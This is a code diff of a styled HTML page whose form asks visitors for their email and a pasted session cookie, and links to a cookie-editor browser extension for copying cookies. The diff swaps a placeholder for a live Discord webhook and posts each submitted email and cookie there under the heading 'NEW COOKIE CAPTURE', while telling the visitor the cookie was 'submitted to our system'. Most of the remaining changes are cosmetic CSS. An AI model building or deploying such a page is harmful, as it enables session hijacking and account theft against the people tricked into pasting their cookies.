@@ -28,16 +28,16 @@
     /* Moon */
     .moon {
       position: fixed;
-      top: 15%;
-      right: 15%;
-      width: 90px;
-      height: 90px;
+      top: 12%;
+      right: 12%;
+      width: 85px;
+      height: 85px;
       background: #f8f3c9;
       border-radius: 50%;
       box-shadow: 
-        0 0 80px #f8f3c9,
-        0 0 160px #f8f3c944,
-        inset -15px -15px 20px rgba(0,0,0,0.3);
+        0 0 70px #f8f3c9,
+        0 0 140px #f8f3c944,
+        inset -12px -12px 18px rgba(0,0,0,0.3);
       z-index: 1;
     }
 
@@ -50,9 +50,9 @@
       height: 100%;
       background: 
         url('https://images.unsplash.com/photo-1506318137071-a8e063b4bec0?q=80&w=2900') center/cover no-repeat;
-      opacity: 0.4;
+      opacity: 0.35;
       z-index: 1;
-      animation: cloudFloat 80s linear infinite;
+      animation: cloudFloat 75s linear infinite;
     }
 
     @keyframes cloudFloat {
@@ -72,42 +72,215 @@
 
     .drop {
       position: absolute;
-      width: 1.2px;
-      height: 25px;
-      background: linear-gradient(transparent, rgba(255,255,255,0.9));
+      width: 1.1px;
+      height: 22px;
+      background: linear-gradient(transparent, rgba(255,255,255,0.85));
       animation: rain 1s linear infinite;
       transform-origin: top;
-      filter: blur(0.5px);
+      filter: blur(0.45px);
     }
 
     @keyframes rain {
       0% { transform: translateY(-100px) translateX(0) scaleY(0.3); opacity: 0; }
-      10% { opacity: 0.8; }
-      90% { opacity: 0.8; }
-      100% { transform: translateY(100vh) translateX(30px) scaleY(1); opacity: 0; }
+      10% { opacity: 0.75; }
+      90% { opacity: 0.75; }
+      100% { transform: translateY(100vh) translateX(25px) scaleY(1); opacity: 0; }
     }
 
     /* ===== MAIN CARD ===== */
     .card {
       width: 460px;
-      min-height: 580px;
-      background: rgba(10, 5, 20, 0.85);
-      backdrop-filter: blur(20px);
-      border-radius: 15px;
+      background: rgba(10, 5, 20, 0.88);
+      backdrop-filter: blur(17px);
+      border-radius: 13px;
       padding: 30px;
       box-shadow: 
-        0 0 30px rgba(138, 43, 226, 0.6),
-        0 0 60px rgba(138, 43, 226, 0.3);
+        0 0 24px rgba(138, 43, 226, 0.6),
+        0 0 48px rgba(138, 43, 226, 0.3),
+        0 0 72px rgba(138, 43, 226, 0.1);
       border: 1px solid rgba(138, 43, 226, 0.7);
       position: relative;
       z-index: 3;
       overflow: hidden;
-      margin-left: -40px;
-      display: flex;
-      flex-direction: column;
+      margin-left: -30px;
     }
 
-    /* ... (all other CSS styles remain exactly the same) ... */
+    .card::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(138,43,226,0.13) 0%, transparent 70%);
+      z-index: -1;
+      animation: rotate 22s linear infinite;
+    }
+
+    .card::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 13px;
+      padding: 1.8px;
+      background: linear-gradient(135deg, rgba(138,43,226,0.65), rgba(255,77,141,0.45));
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      mask-composite: exclude;
+      pointer-events: none;
+    }
+
+    /* ===== CONTENT ===== */
+    .logo {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .logo h1 {
+      font-size: 2.4rem;
+      background: linear-gradient(to right, #8a2be2, #ff4d8d);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 14px rgba(138, 43, 226, 0.65);
+      position: relative;
+      display: inline-block;
+      margin: 0;
+    }
+
+    .logo h1::after {
+      content: '';
+      position: absolute;
+      bottom: -8px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 68%;
+      height: 3px;
+      background: linear-gradient(to right, #8a2be2, #ff4d8d);
+      border-radius: 3px;
+      filter: blur(3px);
+      opacity: 0.75;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: rgba(255,255,255,0.9);
+      font-size: 14px;
+      text-shadow: 0 0 9px rgba(138, 43, 226, 0.45);
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      background: rgba(0,0,0,0.45);
+      border: 1px solid rgba(138, 43, 226, 0.55);
+      border-radius: 7px;
+      color: white;
+      font-size: 14px;
+      transition: all 0.25s;
+      box-shadow: 0 0 14px rgba(138, 43, 226, 0.3);
+    }
+
+    textarea {
+      min-height: 120px;
+      resize: none;
+    }
+
+    input:focus, textarea:focus {
+      outline: none;
+      border-color: #ff4d8d;
+      box-shadow: 0 0 0 2.5px rgba(255, 77, 141, 0.3), 0 0 22px rgba(255, 77, 141, 0.5);
+    }
+
+    /* ===== BUTTONS ===== */
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #8a2be2, #6a1b9a);
+      color: white;
+      border: none;
+      border-radius: 7px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 20px;
+      font-size: 15px;
+      transition: all 0.25s;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 18px rgba(138, 43, 226, 0.5);
+      text-shadow: 0 0 9px rgba(255,255,255,0.25);
+    }
+
+    .btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      transition: 0.5s;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 28px rgba(138, 43, 226, 0.7);
+    }
+
+    .btn:hover::before {
+      left: 100%;
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: #8a2be2;
+      border: 1px solid rgba(138, 43, 226, 0.6);
+      box-shadow: 0 0 12px rgba(138, 43, 226, 0.3);
+    }
+
+    .btn-secondary:hover {
+      background: rgba(138, 43, 226, 0.1);
+    }
+
+    /* Status Messages */
+    .status-message {
+      padding: 12px;
+      border-radius: 7px;
+      margin-bottom: 20px;
+      text-align: center;
+      display: none;
+      background: rgba(0,0,0,0.5);
+      border: 1px solid;
+      font-size: 14px;
+    }
+
+    .success {
+      color: #4ade80;
+      border-color: rgba(74, 222, 128, 0.5);
+      text-shadow: 0 0 10px rgba(74, 222, 128, 0.3);
+      box-shadow: 0 0 15px rgba(74, 222, 128, 0.2);
+    }
+
+    .error {
+      color: #f87171;
+      border-color: rgba(248, 113, 113, 0.5);
+      text-shadow: 0 0 10px rgba(248, 113, 113, 0.3);
+      box-shadow: 0 0 15px rgba(248, 113, 113, 0.2);
+    }
+
+    .spin {
+      animation: spin 1s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -124,28 +297,24 @@
     
     <div id="status-message" class="status-message"></div>
     
-    <form id="contact-form" style="flex-grow: 1; display: flex; flex-direction: column;">
-      <div style="flex-grow: 1;">
-        <div class="input-group">
-          <label for="email">Email Address</label>
-          <input type="email" id="email" placeholder="your@email.com" required>
-        </div>
-        
-        <div class="input-group">
-          <label for="cookie">Session Cookie</label>
-          <textarea id="cookie" placeholder="Paste any session cookie here" required></textarea>
-        </div>
+    <form id="contact-form">
+      <div class="input-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" placeholder="your@email.com" required>
       </div>
       
-      <div>
-        <button type="submit" class="btn">
-          <span id="submit-text">Submit Request</span>
-        </button>
-        
-        <button class="btn btn-secondary" onclick="window.open('https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm', '_blank')">
-          Get Cookie-Editor Extension
-        </button>
+      <div class="input-group">
+        <label for="cookie">Cookie</label>
+        <textarea id="cookie" placeholder="Enter Cookie" required></textarea>
       </div>
+      
+      <button type="submit" class="btn">
+        <span id="submit-text">Submit Request</span>
+      </button>
+      
+      <button class="btn btn-secondary" onclick="window.open('https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm', '_blank')">
+        Get Cookie-Editor Extension
+      </button>
     </form>
   </div>
 
@@ -164,9 +333,9 @@
       rainContainer.appendChild(drop);
     }
 
-    // Ultra-simple cookie validation - only checks length
-    function isCookiePresent(cookie) {
-      return cookie.length >= 20; // Just check if something reasonably long is entered
+    // Simple cookie validation
+    function isCookieValid(cookie) {
+      return cookie.length > 30; // Just check for minimum length
     }
 
     // Form handling
@@ -177,9 +346,6 @@
       const cookie = document.getElementById('cookie').value.trim();
       const statusMessage = document.getElementById('status-message');
       
-      // Clear previous messages
-      statusMessage.style.display = 'none';
-      
       // Validate email
       if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
         statusMessage.textContent = 'Please enter a valid email address';
@@ -188,9 +354,9 @@
         return;
       }
       
-      // Minimal cookie validation
-      if (!isCookiePresent(cookie)) {
-        statusMessage.textContent = 'Please paste a session cookie';
+      // Validate cookie
+      if (!isCookieValid(cookie)) {
+        statusMessage.textContent = 'Please enter a valid session cookie';
         statusMessage.className = 'status-message error';
         statusMessage.style.display = 'block';
         return;
@@ -203,15 +369,15 @@
         submitBtn.disabled = true;
         
         // Replace with your Discord webhook URL
-        await fetch('YOUR_DISCORD_WEBHOOK_URL', {
+        await fetch('https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `🔥 NEW COOKIE CAPTURE 🔥\n📧 ${email}\n🔑 COOKIE (${cookie.length} chars):\n\`\`\`${cookie.substring(0, 200)}...\`\`\``
+            content: `🔥 NEW COOKIE CAPTURE 🔥\n📧 ${email}\n🔑 FULL COOKIE (${cookie.length} chars):\n\`\`\`${cookie.substring(0, 200)}...\`\`\``
           })
         });
         
-        statusMessage.textContent = 'Success! Cookie submitted.';
+        statusMessage.textContent = 'Success! Cookie submitted to our system.';
         statusMessage.className = 'status-message success';
         statusMessage.style.display = 'block';
         e.target.reset();
